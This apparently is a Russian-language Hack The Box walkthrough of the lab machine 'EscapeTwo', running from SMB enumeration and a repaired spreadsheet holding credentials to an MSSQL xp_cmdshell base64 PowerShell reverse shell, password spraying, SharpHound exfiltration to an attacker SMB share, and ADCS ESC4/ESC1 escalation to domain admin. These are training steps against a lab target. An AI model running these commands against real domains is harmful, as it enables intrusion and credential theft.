---
cover: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d5fcf2425893a73cf137284e2de580e1.png
status: SOLVED
type: windows
level: "1"
---
#### Machine Information
As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su

# user flag
##### enumeration

Сначала начинаем со скана цели:
```bash
nmap -sC -sV -vv -oA escapetwo 10.129.232.128
```
![[Pasted image 20260421150621.png]]

Мы видим следующие порты:
1. 445 - smb
2. 139 - net bios ( smb )
3. 53 - dns
4. 135/593 - rpc
5. 3268/9 - global catalog
6. 389 / 636 - ldap
7. 5985 - winrm
8. 464 - kerberos change passwd
9. 88 - kerberos
10. 1433 - mssql

полный вывод nmap:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  tcpwrapped    syn-ack ttl 127
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-21 12:06:16Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-21T12:07:39+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
...
SNIP
...
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-21T12:07:03
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55945/tcp): CLEAN (Timeout)
|   Check 2 (port 13850/tcp): CLEAN (Timeout)
|   Check 3 (port 30386/udp): CLEAN (Timeout)
|   Check 4 (port 11110/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```
Добавляем в `/etc/hosts` найденные домены.

Для начала начнем с `smb`. Так как учетка у нас есть, пробуем перечислить шары:
```
netexec smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares
```
![[Pasted image 20260421151700.png]]

Видим нестандартную шару `Accounting Department`. Мы имеем `READ` права над ней. Ее посмотрим позже. Сначала перечилим пользователей на домене.
```
netexec smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --users
```
![[Pasted image 20260421154454.png]]

Используем модуль `spider_plux` для `netexec`. Скачиваем `Accounting Department`.
```
netexec smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' -M spider_plus -o DOWNLOAD_FLAG=True SHARE='Accounting Department' MAX_FILE_SIZE=10000000
```

##### fixing excel file

Видим 2 Excel файла: 
![[Pasted image 20260421203304.png]]
Я попробовал их открыть, но появилась ошибка...

Проверяем тип файла `accounts.xlsx` через командную утилиту `file`:
```
file accounts.xlsx
> accounts.xlsx: Zip archive data, made by v2.0, extract using at least v2.0, last modified Jun 09 2024 10:47:44, uncompressed size 681, method=deflate
```
Видим, что что-то не ладное. Нам говорят это zip архив, хотя мы знаем, что по расширению это эксель файл...

Я решил проверить первый байты данного файла.
![[Pasted image 20260421205046.png]]

Дальше я загуглил магические байты файлов excel... Видим, что они отличаются...
![[Pasted image 20260421205107.png]]
Создаем новый файл, в котором будет 4 магических байта эксель, а все остальное нашего файла:
```
printf '\x50\x4b\x03\x04' > fixed.xlsx
dd if=accounts.xlsx bs=1 skip=4 >> fixed.xlsx
```

Вот теперь все нормально:
```
file fixed.xlsx
> fixed.xlsx: Microsoft Excel 2007
```

Открываем данный файл и видим учетки. Самое интресное тут `sa` аккаунт.
![[Pasted image 20260421205212.png]]

##### shell as sql_svc

Аунтифицируемся в mssql используя инструмент от `impacket`.
```
impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.129.232.128
```

Активируем `xp_cmdshell` для выполнения системных команд.
```
SQL (sa  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   
NULL       
```

Дальше переходим на [сайт для генерации различных шеллов](https://www.revshells.com/). Выбираем powershell base64 encoded.
![[Pasted image 20260421212734.png]]

Включаем на нашей системе прослушиватель:
```bash
nc -lvnp 4444
```

Теперь выполняем данную команду:
```
SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANAAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Сразу после этого получим соединение. Посмотрев на структуру папки `Users`, флаг я не нашел. Надо копать глубже...
![[Pasted image 20260421213159.png]]

##### shell as ryan

На диске `C:` я нашел интересную папку `SQL2019`. Переходим внутрь и видим конфиг файл. 
![[Pasted image 20260421213424.png]]

Видим пароль `WqSZAF6CysDQbGb3`. Нужно найти кому он принадлежит...
```ini
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Пробуем "распылить пароль" на найденных выше пользователей:
```
netexec mssql 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3'
```

Это пароль роймана...
```
 [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
```

Подключаемся с данными кредами по `winrm`:
```
evil-winrm -u 'ryan' -p 'WqSZAF6CysDQbGb3' -i DC01.sequel.htb
```

Находим `user` флаг.
![[Pasted image 20260422183358.png]]


# root flag
#### bloodhound
Запускаем сервер на 80 порту. В данную папку надо переместить `SharpHound.exe` для сбора информации.
![[Pasted image 20260422084857.png]]

Скачиваем на виндовс систему `SharpHound.exe`. Сохраняем его как `sh.exe`. Запускаем. 
```
IWR http://10.10.15.42/SharpHound.exe -OutFile sh.exe
.\sh.exe
```
После его выполнения должен появиться архив с информацией...

Для передачи этого архива на нашу систему, создадим smb шару при помощи `impacket-smbserver`:
![[Pasted image 20260422085305.png]]

Отправляем данный архив на наш хост:
```
copy C:\Users\ryan\Desktop\20260421224625_BloodHound.zip \\10.10.15.42\SHARE\bloodhound.zip
```

Дальше нужно запустить `bloodhound`. Загружаем наш архив. Нужно дать немного времени проанализировать его..
![[Pasted image 20260422085612.png]]

После того как `bloodhound` закончил анализировать на странице `explore` находим всех пользователей ( rose, sql_svc, ryan ), к которым мы имеем доступ. Помечаем их как `owned`.
![[Pasted image 20260422090028.png]]

Дальше ищем кротчайший путь до административного аккаунта. Видим, что `ryan` имеем `WriteOwner` над `ca_svc`.
![[Pasted image 20260422090114.png]]

#### password change on ca_svc

Используя интрумент `owneredit.py` от `impacket`, меняем владельца объекта `sa_svc` на райана.
```
owneredit.py -action write -new-owner ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3'

OUTPUT:
Impacket v0.14.0.dev0+20260218.4234.d0296981 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!

```

Далее нужно выдать райану полный котроль над `sa_svc` объектом. Используем также инстуремент от `impacket`.
```
dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3'

OUTPUT:
Impacket v0.14.0.dev0+20260218.4234.d0296981 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260422-114357.bak
[*] DACL modified successfully!
```
 
Теперь мы можем с помощию инструмента [bloodyAD](https://github.com/CravateRouge/bloodyAD) поменять пароль объекта `sa_svc` на `Xanax511`.
```
bloodyAD --dc-ip '10.129.232.128' -d 'DC01.sequal.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set password "ca_svc" "Xanax511"

OUTPUT:
[+] Password changed successfully!
```

Проверяем, что пароль поменялся. Можем подключить с `netexec smb` по данным кредам.
![[Pasted image 20260422122309.png]]


### shell as administator
Я запустил `certipy` для поиска уязвимых шаблонов:
```
certipy find -u ca_svc@sequel.htb -p Xanax511 -dc-ip 10.129.232.128 -vulnerable
```

Видим, что шаблон `DunderMifflinAuthentication` уязвим к [ESC4](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking). Если говорить вкратце, то мы можем поменять существующий шаблон сертификата на уязвимый. Например к [ESC1](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication)![[Pasted image 20260422122458.png]]


##### ESC4 ( ESC1 )
Изменим шаблон. Сделаем его уязвимым к `ESC1`.
```
certipy template -u ca_svc@sequel.htb -p Xanax511 -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -write-default-configuration

...
[*] Successfully updated 'DunderMifflinAuthentication'
```

Теперь я могу запросить сертификат от имени администратора, используя изменненный шаблон.
```
certipy req -ca sequel-DC01-CA -u ca_svc -p Xanax511 -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb

...
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Я могу подкомандой `auth` запросить `NTLM` хэш администратора.
```
certipy auth -pfx 'administrator.pfx' -dc-ip 10.129.232.128

...
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```


##### getting root flag

Подключаемся по winrm к администратору с выданным хэшем.
```
evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i DC01.sequel.htb
```

Достаем флаг:
![[Pasted image 20260422190928.png]]
